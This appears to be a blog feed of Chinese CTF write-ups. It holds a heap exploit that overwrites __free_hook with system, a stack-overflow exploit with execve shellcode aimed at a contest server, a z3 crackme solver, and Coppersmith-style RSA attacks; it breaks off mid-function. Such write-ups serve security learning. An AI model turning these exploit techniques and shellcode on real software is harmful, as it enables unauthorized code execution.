memleak1()second_addr = first_addr + <span class="hljs-number">0x38</span>log.success(<span class="hljs-string">"second addr : "</span> + hex(second_addr))<span class="hljs-comment">#create second book</span>create_book(<span class="hljs-number">0x21000</span>,<span class="hljs-string">"a"</span>,<span class="hljs-number">0x21000</span>,<span class="hljs-string">"a"</span>)<span class="hljs-comment">#fake first book</span>payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">1</span>) + p64(second_addr)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xffff</span>)edit_book(<span class="hljs-number">1</span>,payload)<span class="hljs-comment">#null byte off-by-one</span>change_name(<span class="hljs-string">"a"</span>*<span class="hljs-number">32</span>)<span class="hljs-comment">#leak second book pointer</span>sec_name_addr = memleak2()libcbase = sec_name_addr - <span class="hljs-number">0x5b0010</span>log.info(<span class="hljs-string">"libcbase: %s"</span> % hex(libcbase))free_hook = libc.symbols[<span class="hljs-string">'__free_hook'</span>] + libcbaselog.success(<span class="hljs-string">"free_hook : "</span> + hex(free_hook))execve_addr = libcbase + <span class="hljs-number">0x45216</span>log.success(<span class="hljs-string">"execve : "</span> + hex(execve_addr))<span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment"># getshell</span>system = libc.symbols[<span class="hljs-string">'system'</span>] + libcbasebinsh_addr = libc.search(<span class="hljs-string">'/bin/sh'</span>).next() + libcbasepayload = p64(binsh_addr) + p64(free_hook)edit_book(<span class="hljs-number">1</span>, payload)payload = p64(system)edit_book(<span class="hljs-number">2</span>, payload)<span class="hljs-string">'''edit_book(1,p64(free_hook)*2)edit_book(2,p64(execve_addr))'''</span>delete_book(<span class="hljs-number">2</span>)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TokyoWesternsCTF 2019 writeup</title>
      <link href="/2019/09/02/TokyoWesternsCTF-2019-writeup/"/>
      <url>/2019/09/02/TokyoWesternsCTF-2019-writeup/</url>
      
        <content type="html"><![CDATA[<p>tcl 做了三道签到题目</p><h2 id="warmup">warmup<a class="post-anchor" href="#warmup"></a></h2><p>没有任何保护的栈溢出</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *elf=ELF(<span class="hljs-string">'./pwn'</span>)shellcode = <span class="hljs-string">"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"</span>addr=<span class="hljs-number">0x0000000000601A00</span>buf=<span class="hljs-number">0x00007FFE0740F240</span>ret=<span class="hljs-number">0x00007FFE0740F348</span><span class="hljs-comment">#io=process('./pwn')</span><span class="hljs-comment">#pause()</span>io=remote(<span class="hljs-string">'nothing.chal.ctf.westerns.tokyo'</span>,<span class="hljs-number">10001</span>)io.sendline((ret-buf)*<span class="hljs-string">'a'</span>+p64(<span class="hljs-number">0x0000000000400773</span>)+p64(addr)+p64(elf.plt[<span class="hljs-string">'gets'</span>])+p64(addr))io.sendline(shellcode)io.interactive()</code></pre><h2 id="easy-crackme">easy_crackme<a class="post-anchor" href="#easy-crackme"></a></h2><p>这道题目耗时间比较长<br>最后用z3 一个一个进行约束即可</p><h3 id="check1">check1<a class="post-anchor" href="#check1"></a></h3><pre><code class="hljs cpp">v46 = '76543210';v47 = 'fedcba98';for ( i = 0; i &lt;= 15; ++i )&#123;  for ( j = strchr(s, *((char *)&amp;v46 + i)); j; j = strchr(j + 1, *((char *)&amp;v46 + i)) )    ++*((_DWORD *)&amp;s1 + i);&#125;if ( memcmp(&amp;s1, &amp;unk_400F00, 0x40uLL) )&#123;  puts("incorrect");  exit(0);&#125;</code></pre><p>判断字符出现次数</p><h3 id="check2">check2<a class="post-anchor" href="#check2"></a></h3><pre><code class="hljs cpp">v21 = <span class="hljs-number">0L</span>L;    v22 = <span class="hljs-number">0L</span>L;    v23 = <span class="hljs-number">0L</span>L;    v24 = <span class="hljs-number">0L</span>L;    v25 = <span class="hljs-number">0L</span>L;    v26 = <span class="hljs-number">0L</span>L;    v27 = <span class="hljs-number">0L</span>L;    v28 = <span class="hljs-number">0L</span>L;    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">7</span>; ++k )    &#123;      v10 = <span class="hljs-number">0</span>;      v11 = <span class="hljs-number">0</span>;      <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt;= <span class="hljs-number">3</span>; ++l )                <span class="hljs-comment">// 遍历 &#123;***&#125; 的内容</span>      &#123;        v5 = s[<span class="hljs-number">4</span> * k + <span class="hljs-number">6</span> + l];        v10 += v5;        v11 ^= v5;      &#125;      *((_DWORD *)&amp;v21 + k) = v10;              <span class="hljs-comment">// 四个一组的和</span>      *((_DWORD *)&amp;v25 + k) = v11;              <span class="hljs-comment">// 四个一组异或的值</span>    &#125;</code></pre><h3 id="check3">check3<a class="post-anchor" href="#check3"></a></h3><pre><code class="hljs cpp">v29 = <span class="hljs-number">0L</span>L;v30 = <span class="hljs-number">0L</span>L;v31 = <span class="hljs-number">0L</span>L;v32 = <span class="hljs-number">0L</span>L;v33 = <span class="hljs-number">0L</span>L;v34 = <span class="hljs-number">0L</span>L;v35 = <span class="hljs-number">0L</span>L;v36 = <span class="hljs-number">0L</span>L;<span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">7</span>; ++m )&#123;  v14 = <span class="hljs-number">0</span>;  v15 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt;= <span class="hljs-number">3</span>; ++n )  &#123;    v6 = s[<span class="hljs-number">8</span> * n + <span class="hljs-number">6</span> + m];    v14 += v6;    v15 ^= v6;  &#125;  *((_DWORD *)&amp;v29 + m) = v14;  *((_DWORD *)&amp;v33 + m) = v15;&#125;<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(&amp;v21, &amp;unk_400F40, <span class="hljs-number">0x20</span>uLL) || <span class="hljs-built_in">memcmp</span>(&amp;v25, &amp;unk_400F60, <span class="hljs-number">0x20</span>uLL) )&#123;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(&amp;v29, &amp;unk_400FA0, <span class="hljs-number">0x20</span>uLL) || <span class="hljs-built_in">memcmp</span>(&amp;v33, &amp;unk_400F80, <span class="hljs-number">0x20</span>uLL) )&#123;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><h3 id="check4">check4<a class="post-anchor" href="#check4"></a></h3><pre><code class="hljs cpp"><span class="hljs-built_in">memset</span>(v45, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v45));<span class="hljs-keyword">for</span> ( ii = <span class="hljs-number">0</span>; ii &lt;= <span class="hljs-number">31</span>; ++ii )&#123;  v7 = s[ii + <span class="hljs-number">6</span>];  <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0x2F</span> || v7 &gt; <span class="hljs-number">0x39</span> )  &#123;    <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0x60</span> || v7 &gt; <span class="hljs-number">0x66</span> )      v45[ii] = <span class="hljs-number">0</span>;    <span class="hljs-keyword">else</span>      v45[ii] = <span class="hljs-number">0x80</span>;  &#125;  <span class="hljs-keyword">else</span>  &#123;    v45[ii] = <span class="hljs-number">0xFF</span>;  &#125;&#125;<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(v45, &amp;unk_400FC0, <span class="hljs-number">0x80</span>uLL) )&#123;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><h3 id="check5">check5<a class="post-anchor" href="#check5"></a></h3><pre><code class="hljs cpp">v18 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> ( jj = <span class="hljs-number">0</span>; jj &lt;= <span class="hljs-number">15</span>; ++jj )      v18 += s[<span class="hljs-number">2</span> * (jj + <span class="hljs-number">3</span>)];    <span class="hljs-keyword">if</span> ( v18 != <span class="hljs-number">1160</span> )    &#123;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    &#125;</code></pre><h3 id="check6">check6<a class="post-anchor" href="#check6"></a></h3><pre><code class="hljs cpp">  <span class="hljs-keyword">if</span> ( s[<span class="hljs-number">37</span>] != <span class="hljs-number">0x35</span> || s[<span class="hljs-number">7</span>] != <span class="hljs-number">102</span> || s[<span class="hljs-number">11</span>] != <span class="hljs-number">0x38</span> || s[<span class="hljs-number">12</span>] != <span class="hljs-number">0x37</span> || s[<span class="hljs-number">23</span>] != <span class="hljs-number">0x32</span> || s[<span class="hljs-number">31</span>] != <span class="hljs-number">0x34</span> )  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  &#125;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Correct: %s\n"</span>, s, a2);  result = <span class="hljs-number">0L</span>L;&#125;</code></pre><p>解题脚本如下：</p><pre><code class="hljs python"><span class="hljs-comment"># !user/bin/python2.7</span><span class="hljs-comment"># coding:utf-8</span><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *s = Solver()flag = [BitVec(<span class="hljs-string">"a%d"</span>%i,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>)]sum1 = [<span class="hljs-number">0x15E</span>, <span class="hljs-number">0x0DA</span>, <span class="hljs-number">0x12F</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x0FB</span>, <span class="hljs-number">0x102</span>]xor1 = [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x58</span>]sum2 = [<span class="hljs-number">0x129</span>, <span class="hljs-number">0x103</span>, <span class="hljs-number">0x12B</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x135</span>, <span class="hljs-number">0x10B</span>, <span class="hljs-number">0x0FF</span>, <span class="hljs-number">0x0FF</span>]xor2 = [<span class="hljs-number">1</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x51</span>]cnt = [<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]memcmp = [<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>]d = <span class="hljs-string">"0123456789abcdef"</span><span class="hljs-string">'''for i in range(0,16):s.add(str(flag).count(str(ord(d[i])))==cnt[i])'''</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):<span class="hljs-keyword">if</span> memcmp[j] == <span class="hljs-number">0x80</span>:s.add(flag[j]&gt; <span class="hljs-number">0x60</span>)s.add(flag[j]&lt;=<span class="hljs-number">0x66</span>)<span class="hljs-keyword">else</span>:s.add(flag[j]&lt;=<span class="hljs-number">0x39</span>)s.add(flag[j]&gt; <span class="hljs-number">0x2f</span>)<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flag:s.add(<span class="hljs-number">0x30</span>&lt;=x)s.add(<span class="hljs-number">0x67</span>&gt;x)s.add(flag[<span class="hljs-number">1</span>]==<span class="hljs-number">102</span>)s.add(flag[<span class="hljs-number">5</span>]==<span class="hljs-number">0x38</span>)s.add(flag[<span class="hljs-number">6</span>]==<span class="hljs-number">0x37</span>)s.add(flag[<span class="hljs-number">17</span>]==<span class="hljs-number">0x32</span>)s.add(flag[<span class="hljs-number">25</span>]==<span class="hljs-number">0x34</span>)s.add(flag[<span class="hljs-number">31</span>]==<span class="hljs-number">0x35</span>)<span class="hljs-comment">#for i in range(len())</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(flag)):s.add(flag[i]!=<span class="hljs-number">51</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(flag),<span class="hljs-number">4</span>):s.add(flag[i]+flag[i+<span class="hljs-number">1</span>]+flag[i+<span class="hljs-number">2</span>]+flag[i+<span class="hljs-number">3</span>]==sum1[i/<span class="hljs-number">4</span>])s.add(flag[i]^flag[i+<span class="hljs-number">1</span>]^flag[i+<span class="hljs-number">2</span>]^flag[i+<span class="hljs-number">3</span>]==xor1[i/<span class="hljs-number">4</span>])<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):s.add(flag[i]+flag[i+<span class="hljs-number">8</span>]+flag[i+<span class="hljs-number">16</span>]+flag[i+<span class="hljs-number">24</span>]==sum2[i])s.add(flag[i]^flag[i+<span class="hljs-number">8</span>]^flag[i+<span class="hljs-number">16</span>]^flag[i+<span class="hljs-number">24</span>]==xor2[i])sum = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>,<span class="hljs-number">2</span>):sum += flag[i]s.add(sum == <span class="hljs-number">1160</span>)<span class="hljs-keyword">print</span> <span class="hljs-string">"[-] check sat ·····"</span><span class="hljs-keyword">if</span> s.check() == sat:m = s.model()<span class="hljs-keyword">print</span> m<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] print flag ·····"</span>kk = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):kk +=  chr(int(<span class="hljs-string">"%s"</span> % (m[flag[i]])))<span class="hljs-keyword">print</span> <span class="hljs-string">"TWCTF&#123;"</span>+kk+<span class="hljs-string">"&#125;"</span><span class="hljs-keyword">else</span>:<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] False     ·····"</span></code></pre><h2 id="real-baby-rsa">real baby rsa<a class="post-anchor" href="#real-baby-rsa"></a></h2><p>加密是逐个字符加密<br>我们可以加密所有可见字符<br>然后对比出flag</p><pre><code class="hljs python">flag = <span class="hljs-string">'TWCTF&#123;CENSORED&#125;'</span><span class="hljs-keyword">import</span> libnum<span class="hljs-comment"># Public Parameters</span>N = <span class="hljs-number">36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091</span>e = <span class="hljs-number">65537</span><span class="hljs-string">'''# Encrypt the flag!for char in flag:    print(pow(ord(char), e, N))'''</span>dic = <span class="hljs-string">"TWCTF&#125;&#123;QWERTYUIOPASDFGHJKLZXCVBNM?/&gt;&lt;.,:;\"\'[]qwertyuiopasdfghjklzxcvbnm0123456789!@#$%^&amp;*()_-+=~`"</span>flag = <span class="hljs-string">""</span><span class="hljs-keyword">with</span> open(<span class="hljs-string">'output'</span>) <span class="hljs-keyword">as</span> f:<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:xx = line.rstrip()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:zz = str(pow(ord(i),e,N))<span class="hljs-keyword">if</span> xx[:<span class="hljs-number">600</span>] == zz[:<span class="hljs-number">600</span>]:flag += i<span class="hljs-keyword">break</span><span class="hljs-keyword">print</span> flag</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019强网杯-copperstudy</title>
      <link href="/2019/07/17/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-copperstudy/"/>
      <url>/2019/07/17/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-copperstudy/</url>
      
        <content type="html"><![CDATA[<h2 id="copperstudy-–-coppersmith">copperstudy – coppersmith<a class="post-anchor" href="#copperstudy-–-coppersmith"></a></h2><p>解题脚本</p><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cha1</span><span class="hljs-params">(s,s256)</span>:</span>ss = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):ss = ss + chr(int((s[<span class="hljs-number">2</span> * i] + s[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>]),<span class="hljs-number">16</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):a = ss + chr(i) + chr(j) + chr(h)<span class="hljs-keyword">if</span> hashlib.sha256(a).hexdigest() == s256:<span class="hljs-keyword">return</span> a.encode(<span class="hljs-string">'hex'</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:ip = <span class="hljs-string">'119.3.245.36'</span>port = <span class="hljs-number">12345</span>teamtoken = <span class="hljs-string">'dde3f26577d8d7816378038885943de1'</span>s = remote(ip,port)s.recvuntil(<span class="hljs-string">'[+]hashlib.sha256(skr).hexdigest()='</span>)d256 = s.recvline()s.recvuntil(<span class="hljs-string">"[+]skr[0:5].encode('hex')="</span>)d = s.recvline()data = cha1(d.strip(),d256.strip())s.recvuntil(<span class="hljs-string">"[-]skr.encode('hex')="</span>)s.sendline(data)s.recvuntil(<span class="hljs-string">"[+]teamtoken:"</span>)s.sendline(teamtoken)time.sleep(<span class="hljs-number">2</span>）    <span class="hljs-comment">#challenge1 -- Known High Bits Message Attack</span>m = <span class="hljs-string">'858be94f2f6253ac4586da573086221c8256bf7fe7c7f6d0d4e459fd28abf8883cfa225f5cbb519d2c8e0427aab1dc03979886ac104018ddec85e8edb7bbc590'</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m)time.sleep(<span class="hljs-number">2</span>)    <span class="hljs-comment">#challenge2 -- Factoring with High Bits Known</span>m2 = <span class="hljs-string">"7e2a3378b47f389134bda8811e253ace33c6978fbb5d0022ab312cf1f5246648516b320bf749e71a1d8cbdcab64fdb5ce8159022ea96484949152d31a9f17665"</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m2)time.sleep(<span class="hljs-number">2</span>)<span class="hljs-comment">#challenge3 -- Patial Key Exposure Attack</span>m3 = <span class="hljs-string">"86ee347cbeec999564c0615d33ea5e3cfb5e66f5d00b172194c0f86915de3ff19d2dffc2217caaa608ea6556b18e8f420fc1b287871475a0cd5c8f2d97e4c12c"</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m3)time.sleep(<span class="hljs-number">4</span>)<span class="hljs-comment">#challenge4 -- Basic Broadcast Attack</span>m4 = <span class="hljs-string">"380185242a03c9d6ca7a2e117490ebaf03a493b1250f4e248c732c2714eb6b9fd2fa4c90a4f1d8120ffbafb3b7fda85fff46a67a1da3e316392ec267e1fa7c27"</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m4)         time.sleep(<span class="hljs-number">20</span>)<span class="hljs-comment">#challenge5 -- Related Message Attack</span>    m5 = <span class="hljs-string">"0811b179ddbc246fc00ad94b6251c818e331941732fdfce9979c015ca7f0ec873641338c5814f3e8e50dfab04bd6aa0689334b517de10d7bac398aef23f929b3"</span>s.sendlineafter(<span class="hljs-string">"[-]long_to_bytes(m).encode('hex')="</span>,m5)time.sleep(<span class="hljs-number">4</span>)<span class="hljs-comment">#challenge6 -- Boneh and Durfee attack</span>m6 = <span class="hljs-string">"6b3bb0cdc72a7f2ce89902e19db0fb2c0514c76874b2ca4113b86e6dc128d44cc859283db4ca8b0b5d9ee35032aec8cc8bb96e8c11547915fc9ef05aa2d72b28"</span>s.sendlineafter(<span class="hljs-string">"[-]long_to_bytes(m).encode('hex')="</span>,m6)time.sleep(<span class="hljs-number">4</span>)<span class="hljs-keyword">print</span> s.recv()</code></pre><h3 id="challenge1-–-Known-High-Bits-Message-Attack">challenge1 – Known High Bits Message Attack<a class="post-anchor" href="#challenge1-–-Known-High-Bits-Message-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]proof completed[++++++++++++++++][+]Generating challenge 1[+]n=0x331e53d1808798def926bc2c8081b3a959cec19c04ad6dd3a25357b5e3889dc0bbb8618b80ddecca89494eec6015080cf4402fcef0971f76d978c517ab1e3019ae65fdc443a99036d4adcda780dd662ae3eb5d3c6ce68adfe38137689df75a6196a7a6dc94a681dfb5437439c810416112b250402f53eb2341df2145c569c135L[+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0xab7b8544dc18a13c221d33b8ea84ee69ea3c74a1ce123e6f0a565e6afaff3d2682dfa254170a1200d66e9c017727c43b3c1af221f81d90598741454f68448cef4128ff56bb9929ffd3edaaa8069c08293463ad20486b6e6bee654ab471a3b364122d41f4570f6aa1084eb1eda5eebde1436a488e0390f8057df835f323802d4L[+]((m&gt;&gt;72)&lt;&lt;72)=0x858be94f2f6253ac4586da573086221c8256bf7fe7c7f6d0d4e459fd28abf8883cfa225f5cbb519d2c8e0427aab1dc03979886ac104018000000000000000000L[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><p>题目给了明文的高位部分</p><pre><code class="hljs python">n =e = <span class="hljs-number">3</span>m = randrange(n)c = pow(m, e, n)beta = <span class="hljs-number">1</span>epsilon = beta^<span class="hljs-number">2</span>/<span class="hljs-number">7</span>nbits = n.nbits()kbits = floor(nbits*(beta^<span class="hljs-number">2</span>/e-epsilon))<span class="hljs-comment">#mbar = m &amp; (2^nbits-2^kbits)</span>mbar =c =<span class="hljs-keyword">print</span> “upper %d bits (of %d bits) <span class="hljs-keyword">is</span> given” % (nbits-kbits, nbits)PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e – c<span class="hljs-keyword">print</span> mx0 = f.small_roots(X=<span class="hljs-number">2</span>^kbits, beta=<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># find root &lt; 2^kbits with factor = n</span><span class="hljs-keyword">print</span> mbar + x0<span class="hljs-keyword">print</span> x0</code></pre><h3 id="challenge2-–-Factoring-with-High-Bits-Known">challenge2 – Factoring with High Bits Known<a class="post-anchor" href="#challenge2-–-Factoring-with-High-Bits-Known"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 1 completed[++++++++++++++++][+]Generating challenge 2[+]n=0x116c51f73ef1c6b3b890dd8be446b80ac1dbe93742348e1284a7fdf0c76604ceae72011918f18de6b0ab873500ef2ed351110b67acce5b8c48a750a376c3e0117c44ec58e84e35f2ebf0e553b718720952dc826e364f130c2839c76878e0bfb3be0f24b06b3d91f1655e7ce588d2a3c429901197012db4d8b802308072bfca3fL[+]e=65537[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0x8d8fba82b1ca4e8a6e87b1ed5d50a9e6e49b3fb2aed78208e8c513842dedb5f14b82b39e03ea86089e76b59ff7bec0f6647096098346dcf64c7d1aaf533f99827fd9979dee217c511a3192e99a70d4fcd6aa44b2cf52a1ceddf99db42cbf2872e7e2ed421a4a9ff548bef6dfdad7ef17b09748bdf0025dfb93091e11115ebd4L[+]((p&gt;&gt;128)&lt;&lt;128)=0x2bff4035e24f2023f876abaf53ef53374d0208d59d4350a1cf356050c3a09cfc644d9c46cb59f013fadd96bea4a56dd100000000000000000000000000000000L[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python">n=<span class="hljs-number">0xspan>p=<span class="hljs-number">0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000</span>p_fake = p+<span class="hljs-number">0x10000000000000000000000000</span>pbits = <span class="hljs-number">1024</span>kbits = pbits<span class="hljs-number">-576</span>pbar = p_fake &amp; (<span class="hljs-number">2</span>^pbits<span class="hljs-number">-2</span>^kbits)<span class="hljs-keyword">print</span> <span class="hljs-string">"upper %d bits (of %d bits) is given"</span> % (pbits-kbits, pbits)PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + pbarx0 = f.small_roots(X=<span class="hljs-number">2</span>^kbits, beta=<span class="hljs-number">0.4</span>)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span><span class="hljs-keyword">print</span> x0 + pbar</code></pre><h3 id="challenge3-–-Patial-Key-Exposure-Attack">challenge3 – Patial Key Exposure Attack<a class="post-anchor" href="#challenge3-–-Patial-Key-Exposure-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 2 completed[++++++++++++++++][+]Generating challenge 3[+]n=0x56705388192a25439c7ec9f826467255aeac3a1991b0a5804e8cbe01d4fd33c0accdacc8cb2497969133116d841032cd023f29e4014b0c7619c40ce6e1977308f3587da928fe7c103e8fd68c0e909d229e68c23879c010f88dca4481af1c7030466edc93898b12f31dba9e7aa513fb1fd84c3d1d028cc068160501dafa1d54bL[+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0xcbe7d8021fa02b92239521aeaaf76b2d9553b6b738c79a2c31ef9dcef7875d5bde76f5ebb318660761090869c02c182a29516482e5daf090df76d10eab9398ede85a00d47abb3e27f6a87f8c0928e18c778efb3b6a02acb52257369cbc7e3015bda888e50d5586a34a5554df1f5f0e4cb0b8e9dd442ed939f610d18731be3L[+]d=invmod(e,(p-1)*(q-1))[+]d&amp;((1&lt;&lt;512)-1)=0xd74e2c4973ea6530620197a999a7a78d85a3029dfe8931397ee15b480c2f77b5042938e2f58f60e9c44e4f8d911b661b42dac0dbc0c1513773f870916b2418abL[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partial_p</span><span class="hljs-params">(p0, kbits, n)</span>:</span>    PR.&lt;x&gt; = PolynomialRing(Zmod(n))    nbits = n.nbits()    f = <span class="hljs-number">2</span>^kbits*x + p0    f = f.monic()    roots = f.small_roots(X=<span class="hljs-number">2</span>^(nbits//<span class="hljs-number">2</span>-kbits), beta=<span class="hljs-number">0.3</span>)  <span class="hljs-comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span>    <span class="hljs-keyword">if</span> roots:        x0 = roots[<span class="hljs-number">0</span>]        p = gcd(<span class="hljs-number">2</span>^kbits*x0 + p0, n)        <span class="hljs-keyword">return</span> ZZ(p)<span class="hljs-function"><span class="hljs-keyword">def</span> <span 